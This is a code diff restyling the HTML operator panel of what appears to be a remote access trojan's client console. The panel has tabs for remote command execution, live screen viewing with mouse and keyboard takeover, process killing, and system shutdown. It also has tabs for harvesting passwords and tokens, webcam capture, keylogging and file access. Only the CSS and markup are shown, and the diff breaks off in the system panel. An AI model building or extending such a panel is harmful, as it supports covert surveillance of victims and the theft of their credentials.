@@ -4,105 +4,107 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Client</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0b0d12;color:#e8edf5;font-family:'Inter','Segoe UI',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
-body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 20% 50%,rgba(88,100,255,.04)0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(130,80,223,.03)0%,transparent 50%),radial-gradient(ellipse at 50% 80%,rgba(30,160,80,.02)0%,transparent 50%);pointer-events:none;z-index:0}
-::-webkit-scrollbar{width:4px}
-::-webkit-scrollbar-track{background:#0b0d12}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#090b11;--surf:rgba(255,255,255,.03);--bord:rgba(255,255,255,.06);--txt:#e2e8f0;--txt2:rgba(255,255,255,.35);--acc:#818cf8;--acc2:#5864ff;--grn:#22c55e;--red:#ef4444;--org:#fb923c;--rd:10px}
+html{font-size:14.5px}
+body{background:var(--bg);color:var(--txt);font-family:'Inter',system-ui,sans-serif;min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(ellipse at 20% 50%,rgba(88,100,255,.03)0%,transparent 50%),radial-gradient(ellipse at 80% 20%,rgba(130,80,223,.025)0%,transparent 50%);pointer-events:none;z-index:0}
+::-webkit-scrollbar{width:3px}
+::-webkit-scrollbar-track{background:var(--bg)}
 ::-webkit-scrollbar-thumb{background:rgba(255,255,255,.08);border-radius:10px}
-::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,.15)}
-.header{position:sticky;top:0;z-index:100;background:rgba(11,13,18,.85);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border-bottom:1px solid rgba(255,255,255,.06);padding:0 1.5rem;display:flex;align-items:center;height:56px;gap:1rem}
-.header .back{color:rgba(255,255,255,.4);text-decoration:none;font-size:1.1rem;font-weight:700;width:34px;height:34px;display:flex;align-items:center;justify-content:center;border-radius:8px;transition:all .2s}
+::selection{background:rgba(88,100,255,.3);color:#fff}
+.header{position:sticky;top:0;z-index:100;background:rgba(9,11,18,.88);backdrop-filter:blur(20px);border-bottom:1px solid var(--bord);padding:0 1.2rem;display:flex;align-items:center;height:50px;gap:.8rem}
+.header .back{color:var(--txt2);text-decoration:none;font-size:1rem;font-weight:700;width:30px;height:30px;display:flex;align-items:center;justify-content:center;border-radius:6px;transition:all .15s;flex-shrink:0}
 .header .back:hover{color:#fff;background:rgba(255,255,255,.06)}
-.header h1{color:#f0f4fc;font-size:1rem;font-weight:600;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.header .meta{color:rgba(255,255,255,.3);font-size:.75rem;text-align:right}
-.main{padding:1rem 1.5rem;max-width:1400px;margin:0 auto;position:relative;z-index:1}
-.tabs{display:flex;gap:.15rem;margin-bottom:.8rem;border-bottom:1px solid rgba(255,255,255,.06);padding-bottom:.35rem;overflow-x:auto}
-.tab{background:transparent;color:rgba(255,255,255,.35);border:none;padding:.35rem .8rem;cursor:pointer;font-size:.8rem;font-weight:500;border-radius:6px 6px 0 0;transition:all .2s;white-space:nowrap;display:flex;align-items:center;gap:.3rem}
-.tab:hover{color:rgba(255,255,255,.7);background:rgba(255,255,255,.03)}
-.tab.active{color:#818cf8;background:rgba(88,100,255,.08);box-shadow:inset 0 -1.5px 0 #818cf8}
-.panel{display:none;animation:panelIn .2s ease}
+.header h1{color:#f0f4fc;font-size:.9rem;font-weight:600;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.header .meta{color:var(--txt2);font-size:.7rem;margin-left:auto;white-space:nowrap}
+.main{padding:.7rem 1.2rem;max-width:1400px;margin:0 auto;position:relative;z-index:1}
+.tabs{display:flex;gap:.1rem;margin-bottom:.6rem;overflow-x:auto;overflow-y:hidden;border-bottom:1px solid var(--bord);padding-bottom:.15rem;scrollbar-width:none}
+.tabs::-webkit-scrollbar{display:none}
+.tab{background:transparent;color:var(--txt2);border:none;padding:.3rem.6rem;cursor:pointer;font-size:.73rem;font-weight:500;border-radius:6px 6px 0 0;transition:all .15s;white-space:nowrap;flex-shrink:0}
+.tab:hover{color:rgba(255,255,255,.6);background:rgba(255,255,255,.03)}
+.tab.active{color:var(--acc);background:rgba(88,100,255,.07);box-shadow:inset 0-1.5px 0 var(--acc)}
+.panel{display:none;animation:pin .2s ease}
 .panel.active{display:block}
-@keyframes panelIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:translateY(0)}}
-.cmd-wrap{display:flex;gap:.5rem;margin-bottom:.5rem}
-.cmd-wrap input{flex:1;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);border-radius:10px;padding:.55rem .8rem;color:#e8edf5;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.82rem;outline:none;transition:border-color .2s}
-.cmd-wrap input:focus{border-color:rgba(88,100,255,.4)}
-.output{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:1rem;color:#e8edf5;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.8rem;min-height:300px;max-height:70vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.5}
-.screenshot{max-width:100%;border-radius:12px;border:1px solid rgba(255,255,255,.06);display:block;background:#000}
-.loading{color:rgba(255,255,255,.2);text-align:center;padding:2.5rem;font-size:.88rem}
-.loading .spinner{display:inline-block;width:18px;height:18px;border:2px solid rgba(255,255,255,.06);border-top-color:#818cf8;border-radius:50%;animation:spin .8s linear infinite;margin-right:.6rem;vertical-align:middle}
-@keyframes spin{to{transform:rotate(360deg)}}
-.btn{border:none;padding:.4rem .9rem;border-radius:8px;cursor:pointer;font-size:.8rem;font-weight:600;transition:all .2s;display:inline-flex;align-items:center;gap:.4rem}
-.btn:active{transform:scale(.94)}
-.btn-primary{background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;box-shadow:0 2px 10px rgba(34,197,94,.2)}
-.btn-primary:hover{box-shadow:0 4px 20px rgba(34,197,94,.3);transform:translateY(-1px)}
-.btn-accent{background:linear-gradient(135deg,#5864ff,#7c3aed);color:#fff;box-shadow:0 2px 10px rgba(88,100,255,.2)}
-.btn-accent:hover{box-shadow:0 4px 20px rgba(88,100,255,.3);transform:translateY(-1px)}
-.btn-danger{background:linear-gradient(135deg,#ef4444,#dc2626);color:#fff;box-shadow:0 2px 10px rgba(239,68,68,.2)}
-.btn-danger:hover{box-shadow:0 4px 20px rgba(239,68,68,.3);transform:translateY(-1px)}
-.btn-ghost{background:rgba(255,255,255,.04);color:rgba(255,255,255,.45);border:1px solid rgba(255,255,255,.08)}
-.btn-ghost:hover{background:rgba(255,255,255,.08);color:rgba(255,255,255,.75)}
-.btn-orange{background:linear-gradient(135deg,#fb923c,#f97316);color:#fff;box-shadow:0 2px 10px rgba(251,146,60,.2)}
-.btn-orange:hover{box-shadow:0 4px 20px rgba(251,146,60,.3);transform:translateY(-1px)}
-.btn-purple{background:linear-gradient(135deg,#a78bfa,#7c3aed);color:#fff;box-shadow:0 2px 10px rgba(167,139,250,.2)}
-.btn-purple:hover{box-shadow:0 4px 20px rgba(167,139,250,.3);transform:translateY(-1px)}
-.btn-cyan{background:linear-gradient(135deg,#22d3ee,#06b6d4);color:#fff;box-shadow:0 2px 10px rgba(34,211,238,.2)}
-.btn-cyan:hover{box-shadow:0 4px 20px rgba(34,211,238,.3);transform:translateY(-1px)}
-.btn.active-toggle{outline:2px solid #818cf8;outline-offset:2px;background:rgba(88,100,255,.15)!important;border-color:rgba(88,100,255,.3)!important;color:#818cf8!important}
-.btn-sm{padding:.25rem .6rem;font-size:.73rem}
-.btn-icon{padding:.35rem;min-width:32px;justify-content:center}
-.screen-container{position:relative;display:inline-block;max-width:100%}
-.screen-container canvas{position:absolute;top:0;left:0;cursor:crosshair}
-.ctrl-bar{display:flex;gap:.45rem;margin-bottom:.8rem;flex-wrap:wrap;align-items:center;padding:.5rem .9rem;background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px}
-.ctrl-bar .sep{color:rgba(255,255,255,.06);margin:0 .15rem}
-.ctrl-bar .label{color:rgba(255,255,255,.3);font-size:.73rem;margin-right:.15rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
-.err{color:#f87171;font-size:.78rem;padding:.5rem .8rem;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:8px;margin-bottom:.5rem;display:none}
-.files{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;min-height:300px;max-height:70vh;overflow-y:auto;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.78rem}
-.files .path{background:rgba(0,0,0,.2);border-bottom:1px solid rgba(255,255,255,.06);padding:.4rem .8rem;color:#818cf8;display:flex;align-items:center;gap:.5rem;border-radius:12px 12px 0 0;position:sticky;top:0;z-index:2}
+@keyframes pin{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:translateY(0)}}
+.cmd-line{display:flex;gap:.4rem;margin-bottom:.4rem}
+.cmd-line input{flex:1;background:rgba(255,255,255,.04);border:1px solid var(--bord);border-radius:8px;padding:.45rem.7rem;color:var(--txt);font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.78rem;outline:none;transition:border-color .2s}
+.cmd-line input:focus{border-color:rgba(88,100,255,.35)}
+.output{background:var(--surf);border:1px solid var(--bord);border-radius:var(--rd);padding:.7rem;color:var(--txt);font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.75rem;min-height:220px;max-height:68vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.45}
+.img-out{max-width:100%;border-radius:var(--rd);border:1px solid var(--bord);display:block;background:#000}
+.smol{color:var(--txt2);font-size:.7rem;margin-top:.15rem}
+.loading{color:var(--txt2);text-align:center;padding:2rem;font-size:.82rem}
+.loading .sp{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.06);border-top-color:var(--acc);border-radius:50%;animation:sp .7s linear infinite;margin-right:.5rem;vertical-align:middle}
+@keyframes sp{to{transform:rotate(360deg)}}
+.btn{border:none;padding:.35rem.75rem;border-radius:7px;cursor:pointer;font-size:.75rem;font-weight:600;transition:all .15s;display:inline-flex;align-items:center;gap:.35rem}
+.btn:active{transform:scale(.93)}
+.btn-p{background:linear-gradient(135deg,var(--grn),#16a34a);color:#fff;box-shadow:0 2px 8px rgba(34,197,94,.18)}
+.btn-p:hover{box-shadow:0 4px 16px rgba(34,197,94,.28);transform:translateY(-1px)}
+.btn-a{background:linear-gradient(135deg,var(--acc2),#7c3aed);color:#fff;box-shadow:0 2px 8px rgba(88,100,255,.18)}
+.btn-a:hover{box-shadow:0 4px 16px rgba(88,100,255,.28);transform:translateY(-1px)}
+.btn-d{background:linear-gradient(135deg,var(--red),#dc2626);color:#fff;box-shadow:0 2px 8px rgba(239,68,68,.18)}
+.btn-d:hover{box-shadow:0 4px 16px rgba(239,68,68,.28);transform:translateY(-1px)}
+.btn-g{background:rgba(255,255,255,.04);color:var(--txt2);border:1px solid var(--bord)}
+.btn-g:hover{background:rgba(255,255,255,.07);color:rgba(255,255,255,.65)}
+.btn-o{background:linear-gradient(135deg,var(--org),#f97316);color:#fff;box-shadow:0 2px 8px rgba(251,146,60,.18)}
+.btn-o:hover{box-shadow:0 4px 16px rgba(251,146,60,.28);transform:translateY(-1px)}
+.btn-pu{background:linear-gradient(135deg,#a78bfa,#7c3aed);color:#fff;box-shadow:0 2px 8px rgba(167,139,250,.18)}
+.btn-pu:hover{box-shadow:0 4px 16px rgba(167,139,250,.28);transform:translateY(-1px)}
+.btn-c{background:linear-gradient(135deg,#22d3ee,#06b6d4);color:#fff;box-shadow:0 2px 8px rgba(34,211,238,.18)}
+.btn-c:hover{box-shadow:0 4px 16px rgba(34,211,238,.28);transform:translateY(-1px)}
+.btn.active-on{outline:2px solid var(--acc);outline-offset:2px;background:rgba(88,100,255,.12)!important;border-color:rgba(88,100,255,.25)!important;color:var(--acc)!important}
+.btn-sm{padding:.22rem.5rem;font-size:.7rem}
+.btn-xs{padding:2px 5px;font-size:.58rem;border-radius:3px;background:rgba(255,255,255,.04);border:1px solid var(--bord);color:var(--txt2);cursor:pointer;transition:all .12s}
+.btn-xs:hover{background:rgba(255,255,255,.08);color:var(--txt)}
+.bar{display:flex;gap:.35rem;margin-bottom:.5rem;flex-wrap:wrap;align-items:center;padding:.4rem.7rem;background:var(--surf);border:1px solid var(--bord);border-radius:8px}
+.bar .lb{color:var(--txt2);font-size:.68rem;font-weight:500;text-transform:uppercase;letter-spacing:.04em;margin-right:.1rem}
+.bar .sp{color:var(--bord);margin:0.1rem}
+.err{color:#f87171;font-size:.73rem;padding:.4rem.7rem;background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.15);border-radius:7px;margin-bottom:.4rem;display:none}
+.sel{background:rgba(0,0,0,.25);color:var(--txt);border:1px solid var(--bord);border-radius:7px;padding:.25rem.45rem;font-size:.75rem;outline:none;cursor:pointer;font-family:inherit}
+.sel:focus{border-color:rgba(88,100,255,.3)}
+.inp{background:rgba(255,255,255,.04);border:1px solid var(--bord);border-radius:7px;padding:.3rem.55rem;color:var(--txt);font-size:.75rem;outline:none;font-family:inherit;transition:border-color .2s}
+.inp:focus{border-color:rgba(88,100,255,.3)}
+.files{background:var(--surf);border:1px solid var(--bord);border-radius:var(--rd);min-height:220px;max-height:68vh;overflow-y:auto;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.74rem}
+.files .path{background:rgba(0,0,0,.2);border-bottom:1px solid var(--bord);padding:.3rem.7rem;color:var(--acc);display:flex;align-items:center;gap:.4rem;border-radius:var(--rd) var(--rd) 0 0;position:sticky;top:0;z-index:2;font-size:.7rem}
 .files .path span{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.files .entry{padding:.35rem .8rem;cursor:pointer;display:flex;align-items:center;gap:.5rem;border-bottom:1px solid rgba(255,255,255,.03);transition:background .12s}
+.files .entry{padding:.25rem.7rem;display:flex;align-items:center;gap:.4rem;border-bottom:1px solid rgba(255,255,255,.02);transition:background .08s}
 .files .entry:last-child{border-bottom:none}
-.files .entry:hover{background:rgba(88,100,255,.06)}
-.files .entry .ico{flex-shrink:0;width:1.1rem;text-align:center;font-size:.82rem}
-.files .entry .ico.folder{color:#fb923c}
-.files .entry .ico.file{color:rgba(255,255,255,.25)}
-.files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:#e8edf5}
-.files .entry.dir .nm{color:#f0f4fc}
-.files .entry .sz{color:rgba(255,255,255,.2);font-size:.7rem;white-space:nowrap;min-width:4.5rem;text-align:right}
-.files .entry .dt{color:rgba(255,255,255,.2);font-size:.7rem;white-space:nowrap;min-width:7.5rem;text-align:right}
-.files .entry .acts{display:flex;gap:2px;flex-shrink:0;opacity:0;transition:opacity .15s;margin-left:4px}
+.files .entry:hover{background:rgba(88,100,255,.04)}
+.files .entry .ico{flex-shrink:0;width:1rem;text-align:center;font-size:.78rem}
+.files .entry .ico.f{color:var(--org)}
+.files .entry .ico.fl{color:rgba(255,255,255,.2)}
+.files .entry .nm{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;cursor:default;color:var(--txt)}
+.files .entry.dir .nm{cursor:pointer;color:#f0f4fc}
+.files .entry.dir .nm:hover{color:var(--acc)}
+.files .entry .sz{color:var(--txt2);font-size:.65rem;white-space:nowrap;min-width:4rem;text-align:right}
+.files .entry .dt{color:var(--txt2);font-size:.65rem;white-space:nowrap;min-width:6.5rem;text-align:right}
+.files .entry .acts{display:flex;gap:2px;flex-shrink:0;opacity:0;transition:opacity .1s}
 .files .entry:hover .acts{opacity:1}
-.btn-xs{padding:2px 5px;font-size:.62rem;border-radius:4px;line-height:1;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.06);color:rgba(255,255,255,.5);cursor:pointer;transition:all .15s;font-family:inherit}
-.btn-xs:hover{background:rgba(255,255,255,.1);color:#e8edf5}
-.drop-zone{border:2px dashed rgba(255,255,255,.08);border-radius:10px;padding:.5rem .8rem;text-align:center;font-size:.75rem;color:rgba(255,255,255,.25);margin-bottom:.6rem;transition:all .2s;cursor:pointer;position:relative}
-.drop-zone.drag-over{border-color:#818cf8;background:rgba(129,140,248,.06);color:#818cf8}
-.files .entry .nm{cursor:default}.files .entry.dir .nm{cursor:pointer}.files .entry.dir .nm:hover{color:#818cf8}
-select.mon{background:rgba(0,0,0,.3);color:#e8edf5;border:1px solid rgba(255,255,255,.08);border-radius:8px;padding:.35rem .55rem;font-size:.8rem;outline:none;cursor:pointer;font-family:inherit}
-select.mon:focus{border-color:rgba(88,100,255,.4)}
-.capture-bar{display:flex;gap:.5rem;margin-bottom:.8rem;align-items:center;flex-wrap:wrap}
-.proc-table{width:100%;border-collapse:collapse;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.75rem}
-.proc-table th{background:rgba(0,0,0,.2);color:rgba(255,255,255,.35);padding:.4rem .7rem;text-align:left;border-bottom:1px solid rgba(255,255,255,.06);position:sticky;top:0;font-weight:600;font-size:.7rem;text-transform:uppercase;letter-spacing:.04em}
-.proc-table td{padding:.28rem .7rem;border-bottom:1px solid rgba(255,255,255,.03)}
-.proc-table tr:hover{background:rgba(88,100,255,.04)}
-.proc-table .pid{color:rgba(255,255,255,.25);width:4.5rem}
-.proc-table .pname{color:#e8edf5}
-.proc-table .pkill{width:3.5rem;text-align:center}
-.sysinfo-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(170px,1fr));gap:.7rem}
-.sysinfo-card{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:.85rem}
-.sysinfo-card .val{font-size:1.15rem;font-weight:700;color:#f0f4fc}
-.sysinfo-card .lbl{color:rgba(255,255,255,.3);font-size:.73rem;margin-top:.12rem;font-weight:500;text-transform:uppercase;letter-spacing:.03em}
-.disk-bar{height:4px;background:rgba(0,0,0,.3);border-radius:3px;margin-top:.3rem;overflow:hidden}
-.disk-bar .fill{height:100%;background:linear-gradient(90deg,#5864ff,#818cf8);border-radius:3px;transition:width .5s}
-.scroll-output{background:rgba(255,255,255,.03);border:1px solid rgba(255,255,255,.06);border-radius:12px;padding:.8rem;font-family:'SF Mono','Fira Code','Cascadia Code','Consolas',monospace;font-size:.78rem;min-height:200px;max-height:65vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
-.toast{position:fixed;bottom:1.5rem;right:1.5rem;background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;padding:.6rem 1.2rem;border-radius:10px;font-size:.82rem;font-weight:600;z-index:999;animation:toastUp .3s ease;pointer-events:none;box-shadow:0 8px 30px rgba(34,197,94,.3)}
-@keyframes toastUp{from{opacity:0;transform:translateY(20px) scale(.95)}to{opacity:1;transform:translateY(0) scale(1)}}
+.drop-zone{border:2px dashed var(--bord);border-radius:8px;padding:.4rem.7rem;text-align:center;font-size:.7rem;color:var(--txt2);margin-bottom:.5rem;transition:all .2s;cursor:pointer;position:relative}
+.drop-zone.drag{border-color:var(--acc);background:rgba(129,140,248,.06);color:var(--acc)}
+.proc-t{width:100%;border-collapse:collapse;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.72rem}
+.proc-t th{background:rgba(0,0,0,.2);color:var(--txt2);padding:.3rem.6rem;text-align:left;border-bottom:1px solid var(--bord);position:sticky;top:0;font-weight:600;font-size:.65rem;text-transform:uppercase;letter-spacing:.05em}
+.proc-t td{padding:.2rem.6rem;border-bottom:1px solid rgba(255,255,255,.02)}
+.proc-t tr:hover{background:rgba(88,100,255,.03)}
+.proc-t .pid{color:var(--txt2);width:4rem}
+.proc-t .pnm{color:var(--txt)}
+.proc-t .pkl{width:3rem;text-align:center}
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.6rem}
+.card{background:var(--surf);border:1px solid var(--bord);border-radius:9px;padding:.7rem}
+.card .v{font-size:1rem;font-weight:700;color:#f0f4fc}
+.card .l{color:var(--txt2);font-size:.68rem;margin-top:.08rem;font-weight:500;text-transform:uppercase;letter-spacing:.04em}
+.disk-bar{height:3px;background:rgba(0,0,0,.3);border-radius:2px;margin-top:.2rem;overflow:hidden}
+.disk-bar .fill{height:100%;background:linear-gradient(90deg,var(--acc2),var(--acc));border-radius:2px;transition:width .4s}
+.scroll-out{background:var(--surf);border:1px solid var(--bord);border-radius:var(--rd);padding:.7rem;font-family:'JetBrains Mono','SF Mono','Consolas',monospace;font-size:.74rem;min-height:160px;max-height:62vh;overflow-y:auto;white-space:pre-wrap;word-break:break-all;line-height:1.4}
+.toast{position:fixed;bottom:1.2rem;right:1.2rem;background:linear-gradient(135deg,var(--grn),#16a34a);color:#fff;padding:.45rem.9rem;border-radius:8px;font-size:.78rem;font-weight:600;z-index:999;animation:tup .25s ease;pointer-events:none;box-shadow:0 8px 25px rgba(34,197,94,.2)}
+@keyframes tup{from{opacity:0;transform:translateY(12px)scale(.95)}to{opacity:1;transform:translateY(0)scale(1)}}
 @media(max-width:768px){
-.main{padding:.8rem}.tabs{overflow-x:auto;-webkit-overflow-scrolling:touch}
-.tab{padding:.3rem .55rem;font-size:.75rem}.ctrl-bar{padding:.4rem}
-.files .entry .dt{display:none}.header .meta{display:none}
-.sysinfo-grid{grid-template-columns:1fr 1fr}
+.header .meta{display:none}.main{padding:.5rem}.tabs{overflow-x:auto}
+.tab{padding:.25rem.45rem;font-size:.7rem}.bar{padding:.3rem}
+.files .entry .dt{display:none}.grid{grid-template-columns:1fr 1fr}
 }
 </style>
 </head>
@@ -113,214 +115,191 @@ select.mon:focus{border-color:rgba(88,100,255,.4)}
   <div class="meta" id="meta">-</div>
 </div>
 <div class="main">
-  <div class="tabs">
-    <div class="tab active" onclick="switchTab(this,'cmd')">CMD</div>
-    <div class="tab" onclick="switchTab(this,'screenshot')">SCREENSHOT</div>
-    <div class="tab" onclick="switchTab(this,'screen')">LIVE</div>
-    <div class="tab" onclick="switchTab(this,'processes')">PROCESSES</div>
-    <div class="tab" onclick="switchTab(this,'system')">SYSTEM</div>
-    <div class="tab" onclick="switchTab(this,'passwords')">PASSWORDS</div>
-    <div class="tab" onclick="switchTab(this,'network')">NETWORK</div>
-    <div class="tab" onclick="switchTab(this,'services')">SERVICES</div>
-    <div class="tab" onclick="switchTab(this,'apps')">APPS</div>
-    <div class="tab" onclick="switchTab(this,'files')">FILES</div>
-    <div class="tab" onclick="switchTab(this,'webcam')">WEBCAM</div>
-    <div class="tab" onclick="switchTab(this,'tokens')">TOKENS</div>
-    <div class="tab" onclick="switchTab(this,'hostinfo')">HOST</div>
-    <div class="tab" onclick="switchTab(this,'keylog')">KEYLOG</div>
-    <div class="tab" onclick="switchTab(this,'activity')">LOG</div>
+  <div class="tabs" id="tabBar">
+    <div class="tab active" data-tab="cmd">CMD</div>
+    <div class="tab" data-tab="ss">SCREEN</div>
+    <div class="tab" data-tab="live">LIVE</div>
+    <div class="tab" data-tab="proc">PROC</div>
+    <div class="tab" data-tab="sys">SYSTEM</div>
+    <div class="tab" data-tab="pw">PASS</div>
+    <div class="tab" data-tab="net">NET</div>
+    <div class="tab" data-tab="svc">SVC</div>
+    <div class="tab" data-tab="app">APPS</div>
+    <div class="tab" data-tab="files">FILES</div>
+    <div class="tab" data-tab="cam">CAM</div>
+    <div class="tab" data-tab="tokens">TOKENS</div>
+    <div class="tab" data-tab="host">HOST</div>
+    <div class="tab" data-tab="keylog">KEY</div>
+    <div class="tab" data-tab="log">LOG</div>
   </div>
 
-  <div class="panel active" id="panel-cmd">
-    <div class="cmd-wrap">
-      <input id="cmdInput" placeholder="Type command and press Enter..." onkeydown="if(event.key==='Enter')runCmd()">
-      <button class="btn btn-accent" onclick="runCmd()">Run</button>
-      <button class="btn btn-ghost btn-icon" onclick="copyCmdHistory()" title="Copy history">📋</button>
-      <button class="btn btn-ghost btn-icon" onclick="document.getElementById('cmdOutput').textContent='Ready.'" title="Clear">✕</button>
+  <div class="panel active" id="p-cmd">
+    <div class="cmd-line">
+      <input id="cmdIn" placeholder="cmd..." onkeydown="if(event.key==='Enter')runCmd()" autofocus spellcheck="false">
+      <button class="btn btn-a btn-sm" onclick="runCmd()">Run</button>
+      <button class="btn btn-g btn-sm" onclick="copyCmdOut()" title="Copy output">📋</button>
+      <button class="btn btn-g btn-sm" onclick="clrCmd()" title="Clear">✕</button>
     </div>
-    <div class="output" id="cmdOutput">Ready.</div>
+    <div class="output" id="cmdOut">Ready.</div>
     <div id="cmdErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-screenshot">
-    <div class="capture-bar">
-      <select class="mon" id="monSelect"><option value="0">Monitor 1</option></select>
-      <button class="btn btn-primary" onclick="takeScreenshot()">Take Screenshot</button>
+  <div class="panel" id="p-ss">
+    <div class="bar">
+      <span class="lb">Monitor:</span>
+      <select class="sel" id="monSel"><option value="0">1</option><option value="-1">All</option></select>
+      <button class="btn btn-p btn-sm" onclick="takeSS()">Capture</button>
     </div>
-    <div id="ssResult"><div class="loading">Click button to capture</div></div>
+    <div id="ssOut"><div class="loading">Click Capture</div></div>
     <div id="ssErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-screen">
-    <div class="ctrl-bar">
-      <button class="btn btn-primary btn-sm" id="screenStartBtn" onclick="startScreen()">▶ Start Live</button>
-      <button class="btn btn-danger btn-sm" id="screenStopBtn" onclick="stopScreen()" style="display:none">■ Stop</button>
-      <span class="sep">|</span>
-      <span class="label">Monitor:</span>
-      <select class="mon" id="liveMonSelect" onchange="sendLiveConfig()" style="width:80px"><option value="0">Monitor 1</option></select>
-      <span class="sep">|</span>
-      <span class="label">Mouse:</span>
-      <button class="btn btn-ghost btn-sm" id="mouseBtn" onclick="toggleMouse()">OFF</button>
-      <span class="label">Keyboard:</span>
-      <button class="btn btn-ghost btn-sm" id="keyBtn" onclick="toggleKeyboard()">OFF</button>
-      <span class="sep">|</span>
-      <span class="label">Quality:</span>
-      <input type="range" id="liveQuality" min="5" max="50" value="25" style="width:60px;vertical-align:middle" oninput="liveQualityVal.textContent=this.value;sendLiveConfig()">
-      <span id="liveQualityVal" style="color:rgba(255,255,255,.5);font-size:.7rem;min-width:1.5rem">25</span>
-      <span class="sep">|</span>
-      <span class="label">Scale:</span>
-      <select id="liveScaleSelect" onchange="sendLiveConfig()" style="width:60px">
-        <option value="0.25">25%</option>
-        <option value="0.5" selected>50%</option>
-        <option value="0.75">75%</option>
-        <option value="1">100%</option>
+  <div class="panel" id="p-live">
+    <div class="bar">
+      <button class="btn btn-p btn-sm" id="liveStart" onclick="startLive()">▶ Start</button>
+      <button class="btn btn-d btn-sm" id="liveStop" onclick="stopLive()" style="display:none">■ Stop</button>
+      <span class="sp">|</span>
+      <span class="lb">Mon:</span>
+      <select class="sel" id="liveMon" style="width:60px"><option>0</option><option>1</option><option>2</option><option>3</option></select>
+      <span class="lb">Q:</span>
+      <input type="range" id="liveQ" min="5" max="50" value="25" style="width:50px;vertical-align:middle" oninput="lq.textContent=this.value;sendLiveCfg()">
+      <span id="lq" style="color:var(--txt2);font-size:.65rem;min-width:1.2rem">25</span>
+      <span class="lb">S:</span>
+      <select class="sel" id="liveS" style="width:55px" onchange="sendLiveCfg()">
+        <option value="0.25">25%</option><option value="0.5" selected>50%</option><option value="0.75">75%</option><option value="1">100%</option>
       </select>
-      <span id="screenFps" style="color:rgba(255,255,255,.2);font-size:.75rem;margin-left:auto"></span>
+      <span class="lb" style="margin-left:auto">Mouse:</span>
+      <button class="btn btn-g btn-sm" id="mouseBtn" onclick="tgMouse()">OFF</button>
+      <span class="lb">Key:</span>
+      <button class="btn btn-g btn-sm" id="keyBtn" onclick="tgKey()">OFF</button>
+      <span id="fps" style="color:var(--txt2);font-size:.68rem;min-width:3rem;text-align:right">0 fps</span>
     </div>
-    <div id="screenResult"><div class="loading">Click Start to begin live view</div></div>
+    <div id="liveOut"><div class="loading">Start live view</div></div>
   </div>
 
-  <div class="panel" id="panel-processes">
-    <div class="capture-bar">
-      <button class="btn btn-primary" onclick="loadProcesses()">⟳ Refresh</button>
-      <span id="procCount" style="color:rgba(255,255,255,.2);font-size:.75rem"></span>
+  <div class="panel" id="p-proc">
+    <div class="bar">
+      <button class="btn btn-p btn-sm" onclick="loadProc()">⟳ Refresh</button>
+      <input class="inp" id="procSearch" placeholder="Search..." style="flex:1;min-width:80px;max-width:200px" oninput="filterProc()" spellcheck="false">
+      <span id="procCnt" style="color:var(--txt2);font-size:.7rem"></span>
     </div>
-    <div id="procResult"><div class="loading">Click Refresh to list processes</div></div>
+    <div id="procOut"><div class="loading">Load processes</div></div>
     <div id="procErr" class="err"></div>
   </div>
 
-  <div class="panel" id="panel-system">
-    <div class="ctrl-bar" style="margin-bottom:.5rem">
-      <span class="label">Power:</span>
-      <button class="btn btn-danger btn-sm" onclick="sendSystemCmd('shutdown')">Shutdown</button>
-      <button class="btn btn-orange btn-sm" onclick="sendSystemCmd('restart')">Restart</button>
-      <button class="btn btn-ghost btn-sm" onclick="sendSystemCmd('lock')">Lock</button>
